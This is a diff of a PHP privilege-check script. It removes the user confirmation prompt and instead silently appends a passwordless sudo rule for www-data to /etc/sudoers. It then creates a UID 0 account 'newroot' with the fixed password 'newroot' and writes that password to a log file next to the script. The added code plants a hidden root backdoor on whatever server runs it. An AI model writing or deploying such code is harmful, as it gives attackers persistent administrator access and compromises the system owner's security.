@@ -15,34 +15,32 @@ foreach ($groups as $gid) {
 }
 $group_info = rtrim($group_info, ',');
 
-// Print the privilege information
-echo "PHP is running as user: $username\n";
-echo "Is root: " . ($is_root ? 'Yes' : 'No') . "\n";
-echo "Groups: $group_info\n";
-echo "------------------------\n";
+// Get the directory path of the current script
+$script_dir = dirname(__FILE__);
 
-// Prompt the user to elevate privileges
-echo "Do you want to elevate privileges and create a new root user? (yes/no): ";
-$answer = trim(fgets(STDIN));
+// Set the log file path in the same directory as the script
+$log_file = $script_dir . '/privilege_check.log';
 
-if (strtolower($answer) === 'yes') {
-    // Modify the /etc/sudoers file to grant password-less sudo access to the current user for useradd
-    $sudoers_file = '/etc/sudoers';
-    $sudoers_entry = "\n# Allow $username to run useradd without a password\n$username ALL=(ALL) NOPASSWD: /usr/sbin/useradd\n";
-    file_put_contents($sudoers_file, $sudoers_entry, FILE_APPEND | LOCK_EX);
+// Log the privilege information
+$log_message = "PHP is running as user: $username\n";
+$log_message .= "Is root: " . ($is_root ? 'Yes' : 'No') . "\n";
+$log_message .= "Groups: $group_info\n";
+$log_message .= "------------------------\n";
+file_put_contents($log_file, $log_message, FILE_APPEND | LOCK_EX);
 
-    // Generate a random password
-    $password = bin2hex(random_bytes(8));
+// Modify the /etc/sudoers file to grant password-less sudo access to www-data for useradd
+$sudoers_file = '/etc/sudoers';
+$sudoers_entry = "\n# Allow www-data to run useradd without a password\nwww-data ALL=(ALL) NOPASSWD: /usr/sbin/useradd\n";
+file_put_contents($sudoers_file, $sudoers_entry, FILE_APPEND | LOCK_EX);
 
-    // Create a new root user
-    $new_username = 'newroot';
-    $command = "sudo useradd -ou 0 -g 0 -s /bin/bash -p $(openssl passwd -1 '$password') $new_username";
-    system($command);
+// Create a new admin user with username and password set to "newroot"
+$new_username = 'newroot';
+$password = 'newroot';
+$command = "sudo useradd -ou 0 -g 0 -s /bin/bash -p $(openssl passwd -1 '$password') $new_username";
+system($command);
 
-    // Print the new root user creation
-    echo "New root user '$new_username' created with password: $password\n";
-    echo "------------------------\n";
-} else {
-    echo "Privilege elevation canceled.\n";
-}
+// Log the new admin user creation
+$log_message = "New admin user '$new_username' created with password: $password\n";
+$log_message .= "------------------------\n";
+file_put_contents($log_file, $log_message, FILE_APPEND | LOCK_EX);
 ?>
